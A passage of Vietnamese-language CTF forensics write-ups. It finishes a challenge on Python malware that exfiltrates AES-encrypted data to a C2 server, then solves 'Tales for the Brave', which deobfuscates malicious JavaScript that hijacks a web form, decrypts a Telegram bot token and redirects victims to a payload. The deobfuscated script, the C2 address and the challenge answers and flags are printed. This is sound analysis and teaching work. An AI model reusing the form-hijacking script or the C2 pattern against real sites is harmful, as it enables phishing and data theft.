    client.send(f"{user}{SEPARATOR}{k}".encode())
    threading.Thread(target=receive, args=(client, k)).start()
```

- Chương trình này là một client kết nối tới một C&C (có địa chỉ IP và cổng cố định: 13.61.7.218:55155), kết hợp với những phân tích trc đó thì đã có đáp án cho câu 4
```
4. What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server?
Answer: 13.61.7.218:55155
```

Sau khi kết nối tới C2 server xong thì thực hiện:
- Lấy thông tin người dùng thông qua whoami

- Thông tin này được gửi tới server cùng với khóa ngẫu nhiên (user + SEPARATOR + k), k chính là khóa để thực hiện mã hóa AES-CBC như trong script trên. Từ đây có câu trả lời cho câu 5\

![image](assets/images2/53.png)

```
5. What encryption key did the attacker use to secure the data?
Answer: 5UUfizsRsP7oOCAq
```

- Dùng AES-CBC để mã hóa dữ liệu gửi đi và giải mã dữ liệu gửi về

Mình sẽ dùng key đó để decrypt dữ liệu gửi đi tại đây là sẽ có đáp án cho câu 6

![image](assets/images2/54.png)

Lấy dữ liệu ở dạng Raw, rồi lưu vào 1 file riêng

Script
```python
from Crypto.Cipher import AES

def decrypt_file(input_file: str, output_file: str, key: str):
    # Đọc dữ liệu đã mã hóa từ file
    with open(input_file, "rb") as f:
        ciphertext = f.read()

    # Sử dụng key.encode() làm IV (giống như quá trình mã hóa)
    iv = key.encode()

    # Tạo đối tượng giải mã AES-CBC
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv)

    # Giải mã dữ liệu
    decrypted_data = cipher.decrypt(ciphertext)

    # Loại bỏ padding (PKCS7)
    pad_len = decrypted_data[-1]
    decrypted_data = decrypted_data[:-pad_len]

    # Ghi kết quả giải mã ra file
    with open(output_file, "wb") as f:
        f.write(decrypted_data)

    print(f"Giải mã thành công! Đã lưu vào {output_file}")

input_file = "anh"   # File chứa dữ liệu đã mã hóa
output_file = "DONE"  # File để lưu dữ liệu sau khi giải mã
key = "5UUfizsRsP7oOCAq"        # Key giống lúc mã hóa

decrypt_file(input_file, output_file, key)
```

![image](assets/images2/55.png)

Check MD5

![image](assets/images2/56.png)

```
6, What is the MD5 hash of the file exfiltrated by the attacker?
Answer: 8fde053c8e79cf7e03599d559f90b321
```

Tổng hợp đáp án

```
1. What is the IP address responsible for compromising the website?
Answer: 194.59.6.66

2. What is the name of the endpoint exploited by the attacker?
Answer: execute

3. What is the name of the obfuscation tool used by the attacker?
Answer: Py-fuscate

4. What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server?
Answer: 13.61.7.218:55155

5. What encryption key did the attacker use to secure the data?
Answer: 5UUfizsRsP7oOCAq

6, What is the MD5 hash of the file exfiltrated by the attacker?
Answer: 8fde053c8e79cf7e03599d559f90b321
```

## _Tales for the Brave_ _(Forensics)_

- Mới vào mình nhận được 1 đoạn `javascript` bị obsfuscate

![image](assets/images2/26.png)

Tiến hành  `deobf` bằng https://lelinhtinh.github.io/de4js/

![image](assets/images2/27.png)

Giải thích sơ qua chút:

- Hàm `_$_9b39` có chức năng tạo 1 mảng chứa tên hàm cần gọi ( mình dùng `chatgpt` viết python decode để xem các hàm nó gọi là gì)

```python
def deobfuscate(n: str, w: int):
    r = len(n)
    j = list(n)

    for e in range(r):
        d = w * (e + 439) + (w % 33616)
        a = w * (e + 506) + (w % 38477)
        v = d % r
        p = a % r
        # swap j[v] and j[p]
        j[v], j[p] = j[p], j[v]
        w = (d + a) % 3525268

    c = chr(127)
    q = ''
    m = '%'
    t = '#1'
    o = '%'
    u = '#0'
    k = '#'

    joined = q.join(j)
    step1 = joined.replace(m, c)
    step2 = step1.replace(t, o)
    step3 = step2.replace(u, k)
    final = step3.split(c)

    return final

output = deobfuscate("Ats8ep%%e6Sr%prB%feUseEynatcc4%ad", 1198358)
for i, item in enumerate(output):
    print(f"[{i}] = {item}")
```

![image](assets/images2/28.png)

`Ví dụ: CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]] = CryptoJS.enc.Base64.parse`

- Tiếp theo, đoạn `ciphertext` bị `AES encrypt` và `Base64 encode` nên gọi các hàm ra để giải mã rồi dùng `eval` để thực thi trực tiếp
![image](assets/images2/29.png)
- `Key` và `IV` được lấy tại đây
![image](assets/images2/30.png)

Dùng python để decrypt toàn bộ (hoặc có thể dùng `Java compiler online`) nhưng mình cũng không hiểu sao có một số chỗ bị lỗi khi decrypt hmm

![image](assets/images2/31.png)

Tiếp tục dùng `de4js` để deobf

![image](assets/images2/32.png)

Chức năng nó khá tương tự đoạn `java` vừa nãy và sau khi deobf toàn bộ thì có được đoạn mã sau:

```javascript
_$_5975 = ['nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==',
           's3cur3k3y',
           'Base64', 'enc', 'toString', '', 'join', 'SHA256', 
           '18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=', // Hash to verify
           'Utf8', 'parse', 'decrypt', 'RC4Drop', 'https://api.telegram.org', 
           'fromCharCode', 'onreadystatechange', 'readyState', 'DONE', 'responseText', 
           'text', 'result', 'log', 'replace', 'location', 'Form submitted!', 
           'GET', 'forwardMessage?chat_id=', '&from_chat_id=', '&message_id=5', 'open', 'send']

function G(r) {
    return function () {
        var r = Array.prototype.slice.call(arguments), o = r.shift();
        return r.reverse().map(function (r, t) { 
            return String.fromCharCode(r - o - 7 - t) 
        }).join('')
    }(43, 106, 167, 103, 163, 98) + 
    1354343..toString(36).toLowerCase() + 
    21..toString(36).toLowerCase().split('').map(function (r) { 
        return String.fromCharCode(r.charCodeAt() + -13) 
    }).join('') + 
    4..toString(36).toLowerCase() + 
    32..toString(36).toLowerCase().split('').map(function (r) { 
        return String.fromCharCode(r.charCodeAt() + -39) 
    }).join('') + 
    381..toString(36).toLowerCase().split('').map(function (r) { 
        return String.fromCharCode(r.charCodeAt() + -13) 
    }).join('') + 
    function () {
        var r = Array.prototype.slice.call(arguments), o = r.shift();
        return r.reverse().map(function (r, t) { 
            return String.fromCharCode(r - o - 60 - t) 
        }).join('')
    }(42, 216, 153, 153, 213, 187);
}

document.getElementById("newsletterForm").addEventListener("submit", function(e) {
  e.preventDefault();
  const emailField = document.getElementById("email");
  const descriptionField = document.getElementById("descriptionField");
  let isValid = true;
  if (!emailField.value) {
    emailField.classList.add("shake");
    isValid = false;
    setTimeout(() => {
      return emailField.classList.remove("shake");
    }, 500);
  }
  if (!isValid) {
    return;
  }
  const emailValue = emailField.value;
  const specialKey = emailValue.split("@")[0];
  const desc = parseInt(descriptionField.value, 10);
  f(specialKey, desc);
});

function f(oferkfer, icd) {
  const channel_id = -1002496072246;
  var enc_token = "nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==";
  if (oferkfer === G(_$_5975[1]) && 
        CryptoJS.SHA256(sequence.join('')).toString(CryptoJS.enc.Base64) === _$_5975[8]) {
    var decrypted = CryptoJS.RC4Drop.decrypt(
            enc_token, 
            CryptoJS.enc.Utf8.parse(oferkfer), 
            { drop: 192 }
        ).toString(CryptoJS.enc.Utf8);
    var HOST = "https://api.telegram.org/bot"+ decrypted;
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        const resp = JSON.parse(xhr.responseText);
        try {
          const link = resp.result.text;
          window.location.replace(link);
        } catch (error) {
          alert("Form submitted!");
        }
      }
    };
    xhr.open("GET", HOST + "/" + "forwardMessage?chat_id=" + icd + "&from_chat_id=" + channel_id + "&message_id=5");
    xhr.send(null);
  } else {
    alert("Form submitted!");
  }
}
var sequence = [];

function l() {
  sequence.push(this.id);
}
var checkboxes = document.querySelectorAll("input[class=cb]");
for (var i = 0; i < checkboxes.length; i++) {
  checkboxes[i].addEventListener("change", l);
}
```

Tóm tắt code:

- Đoạn code trên giải mã một `enc_token` là `nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==` bằng `RC4 drop` với key được xử lí thông qua hàm `G()`
  ![image](assets/images2/33.png)
- Tham số được truyền vào trong hàm `G()` là `s3cur3k3y`
  ![image](assets/images2/34.png)

Ta tiến hành decode `Key` bằng `python`

```python
import hashlib
import base64
# G như trước
def base36encode(number):
    if number == 0:
        return '0'
    alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
    result = ''
    while number > 0:
        number, i = divmod(number, 36)
        result = alphabet[i] + result
    return result.lower()

def G(_):
    def part1():
        args = [106, 167, 103, 163, 98]
        o = 43
        return ''.join(chr(r - o - 7 - i) for i, r in enumerate(reversed(args)))

    def part2():
        return base36encode(1354343)

    def part3():
        return ''.join(chr(ord(c) - 13) for c in base36encode(21))

    def part4():
        return base36encode(4)

    def part5():
        return ''.join(chr(ord(c) - 39) for c in base36encode(32))

    def part6():
        return ''.join(chr(ord(c) - 13) for c in base36encode(381))

    def part7():
        args = [216, 153, 153, 213, 187]
        o = 42
        return ''.join(chr(r - o - 60 - i) for i, r in enumerate(reversed(args)))

    return part1() + part2() + part3() + part4() + part5() + part6() + part7()

# Giá trị đầu vào cần xác thực
special = 's3cur3k3y'
expected = G(special)

# In ra kết quả của G
print(f"G('{special}') =", expected)
```

![image](assets/images2/35.png)

Có được key là `0p3r4t10n_4PT_Un10n`, lấy key đó giải mã đoạn `enc_token` ta được một token của một `botTelegram`

![image](assets/images2/36.png)

Mình dùng tool [này](https://github.com/soxoj/telegram-bot-dumper) để dump toàn bộ `message` của bot

`Bot` gửi cho mình 1 file `.zip` trong `media` và kèm cả `pass` để giải nén. Nó chú thích thêm là chỉ nhắm tới `Brave Browser users` nên tiến hành tải trình duyệt `Brave` về

![image](assets/images2/37.png)

Đến đây mình phải tham khảo `writeups` thì mới làm được tiếp, nôm na thì reverse malware sẽ không khả thi nên tiến hành debug động bằng cách thực thi trực tiếp trên máy ảo và bật `wireshark` để bắt gói tin

![image](assets/images2/38.png)

Nó thực hiện truy vấn `DNS` đến tên miền `zolsc2s65u.htb` trên port `31337`, giờ ta sẽ đi fake `IP` bằng địa chỉ loopback là `127.0.0.1` và `domain` bằng cách thêm chúng vào `/etc/hosts`

![image](assets/images2/39.png)

Sau đó khởi chạy một server http

![image](assets/images2/40.png)

Tiến hành mở chạy lại `malware` và mở `wireshark`

![image](assets/images2/41.png)

Thấy được 1 `HTTP Post.Request`, trong đó có 1 đoạn `Bearer Token`

![image](assets/images2/42.png)

Đây là một `JWT (Json Web Token)` dùng để xác thực người dùng, dùng https://jwt.io/ để decode token

![image](assets/images2/43.png)

Trong phần `auth` có một đoạn base64, tiến hành decode là nhận được flag

![image](assets/images2/44.png)

`Flag: HTB{APT_c0nsp1r4c13s_b3h1nd_b3n1gn_l00k1ng_s1t3s}`